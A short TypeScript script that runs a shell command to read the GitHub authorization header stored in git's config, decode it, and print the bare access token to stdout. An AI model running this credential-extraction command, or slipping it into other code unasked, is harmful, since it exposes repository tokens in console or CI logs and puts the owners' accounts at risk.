const subProcess = require('child_process');

const main = (): void => {
  subProcess.exec("git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p'", (err: any, stdout: any, stderr: any) => {
    if (err) {
      console.error(err)
      process.exit(1)
    } else {
      console.log(stdout.toString())
    }
  })
};

if (require.main === module) {
  main();
}

export default main;
